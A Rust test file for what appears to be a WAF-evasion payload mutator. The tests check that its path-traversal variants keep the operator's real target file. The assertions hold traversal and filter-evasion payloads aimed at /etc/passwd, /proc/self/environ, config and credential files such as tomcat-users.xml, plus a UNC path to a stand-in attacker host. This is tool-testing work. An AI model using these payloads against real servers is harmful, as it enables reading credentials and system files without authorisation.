//! Path-traversal twin of the SQL/XSS/cmd preservation contracts.
//!
//! Bug pinned: the encoded-`..` traversal forms were hardcoded to
//! `etc/passwd` and the no-traversal list was a canned sibling-file
//! set — so `../../../../var/www/app/config/db.yml` "mutated" into a
//! `/etc/passwd` read. The de-rigged bench would then claim "you can
//! read db.yml" when only passwd was ever sent. Proving side: the
//! operator's real target survives and passwd never appears for a
//! non-passwd attack. Adversarial twin: the canonical
//! `../../../etc/passwd` probe STILL gets the full canned arsenal.

use wafrift_grammar::grammar::path_traversal as pt;

#[test]
fn specific_target_is_never_rewritten_to_passwd() {
    let attack = "../../../../var/www/html/config/secrets.php";
    let variants = pt::mutate(attack);
    assert!(!variants.is_empty(), "no variants for a real traversal");
    assert!(
        variants.iter().any(|v| v.contains("secrets.php")),
        "operator's real target file was discarded entirely"
    );
    for v in &variants {
        assert!(
            !v.contains("etc/passwd") && !v.contains("etc\\passwd"),
            "specific-target attack was rewritten to the canned /etc/passwd: {v:?}"
        );
    }
    // The real attack must still appear in genuine evasion shapes, not
    // only as a bare absolute path.
    assert!(
        variants
            .iter()
            .any(|v| v.contains("secrets.php") && (v.contains("%2f") || v.contains("..%00") || v.contains("....//"))),
        "no encoded-traversal evasion carried the real target"
    );
}

#[test]
fn windows_specific_target_preserved() {
    let attack = "..\\..\\..\\..\\inetpub\\wwwroot\\appsettings.json";
    let variants = pt::mutate(attack);
    assert!(!variants.is_empty());
    assert!(
        variants.iter().any(|v| v.contains("appsettings.json")),
        "windows app-config target was discarded"
    );
    for v in &variants {
        assert!(
            !v.contains("etc/passwd"),
            "windows attack rewritten to /etc/passwd: {v:?}"
        );
    }
}

#[test]
fn adversarial_twin_canonical_passwd_probe_keeps_full_arsenal() {
    // `../../../etc/passwd` IS the canonical sensitive-file probe — the
    // canned sibling-file + encoded-passwd arsenal is its correct
    // product. The gate must not lobotomise it.
    let v = pt::mutate("../../../etc/passwd");
    assert!(
        v.iter().any(|s| s == "/proc/self/environ"),
        "lost canned no-traversal arsenal for the passwd probe"
    );
    assert!(
        v.iter().any(|s| s.contains("..%2f..%2f..%2fetc/passwd")),
        "lost encoded-traversal passwd form"
    );
    assert!(
        v.iter().any(|s| s == "\\\\evil.com\\share"),
        "lost UNC variant"
    );
    assert!(
        v.iter().any(|s| s.contains("/public/..;/etc/passwd")),
        "lost Tsai routing variant"
    );
}

#[test]
fn evade_path_preserves_specific_target() {
    use wafrift_grammar::grammar::{PayloadType, mutate_as};
    let attack = "../../../../opt/tomcat/conf/tomcat-users.xml";
    let out = mutate_as(attack, PayloadType::PathTraversal, 80);
    assert!(!out.is_empty());
    assert!(
        out.iter().any(|m| m.payload.contains("tomcat-users.xml")),
        "evade-path discarded the operator's tomcat-users target"
    );
    for m in &out {
        assert!(
            !m.payload.contains("/etc/passwd") && !m.payload.contains("etc\\passwd"),
            "evade-path rewrote the tomcat-users attack to passwd: {:?}",
            m.payload
        );
    }
}
